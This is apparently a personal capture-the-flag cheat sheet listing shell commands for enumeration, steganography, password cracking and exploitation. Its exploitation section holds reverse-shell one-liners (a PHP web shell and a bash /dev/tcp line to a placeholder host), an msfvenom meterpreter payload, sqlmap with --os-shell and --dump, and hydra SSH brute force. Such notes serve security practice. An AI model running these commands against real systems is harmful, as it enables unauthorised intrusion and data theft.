# List of commands i've used in CTFs
# -----------
# Enumeration
# -----------

# Network Enum
nmap -sV -sC -O -n -oA nmapscan <IP>
sudo nmap -T4 --min-rate 1000 -sV -sC -p- -oN nmap_report <ip>
nmap --script http-enum -v $IP -p80 -oA ~/CTF/$IP/http_enum # HTTP

# Subdomain Enum
gobuster dns -d target.com -w /path/to/wordlist.txt

# Server Enum
gobuster dir -u <url> -w <wordlist>
gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirb/common.txt -o ~/CTF/$IP/gobuster.txt -x .php,.html,.txt
nikto -h <url>
nikto -h http://target.url -useragent "Mozilla/5.0" # Change user agent

# Parameter Fuzzing
ffuf -u http://example.com/page?file=FUZZ -w wordlist.txt

# Files
echo "append this" >> <filename> # Append to end of file
sed -i '$d' <filename> # Remove last line from file
awk '{ print $3, $1 }' foo # Print Columns 3 and 1 from foo
egrep "^([A-Za-z0–9+/]{4})*([A-Za-z0–9+/]{2}==|[A-Za-z0–9+/]{3}=|[A-Za-z0–9+/]{4})$" # Regex for Base64 encoded text
cat $(python -c "print 'A'*76+'\x08\x87\x04\x08'") | ./pwnme # Redirect into executable stdin
/bin/cat $(find / -name flag.txt) # Search for a filename
grep -rwl “password” /path/to/search/dir # Search for string in file
base64 -d # Decode Base64
binwalk -e <filename> # Binwalk extract

# Images
exiftool <filename>
zsteg <filename>
steghide <filename>
pngcheck -v <filename>
stegsolve (GUI)

# Zip
zipdetails <filename>
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' <filename>
zip2john <filename> <outfile>
john <outfile>


# ------------
# Exploitation
# ------------

# Reverse Shells
<?php exec(“/bin/bash -c ‘bash -i >& /dev/tcp/<ip>/<port> 0>&1’”); phpinfo(); ?> # PHP RevShells
/bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1
msfvenom -p  windows/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f exe -o ~CTF/rs.exe # MSF Windows TCP RevShell

# SQL Injection
sqlmap -u <url>/index.php?id=x --os-shell
sqlmap -u <url>/index.php?id=x --dump

# Find files with root permissions
find / -user root -perm /4000

# Brute Force
hydra -l <username> -P <password_list> ssh://<target IP>
python3 sqlmap.py -r /home/tryhackme/expose/expose.req — dump
john --wordlist=/usr/share/wordlists/rockyou.txt <file>




